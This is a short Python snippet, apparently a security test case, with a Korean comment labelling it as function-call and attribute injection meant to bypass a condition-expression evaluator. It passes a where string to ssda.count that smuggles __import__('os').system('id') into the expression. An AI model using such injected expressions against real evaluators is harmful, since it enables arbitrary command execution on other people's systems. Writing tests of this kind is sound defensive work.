# 기법: 조건식에 함수 호출·속성 주입 / 노림: 조건식 평가기 우회
import ssda
print(ssda.count(where='__import__("os").system("id") == 0'))
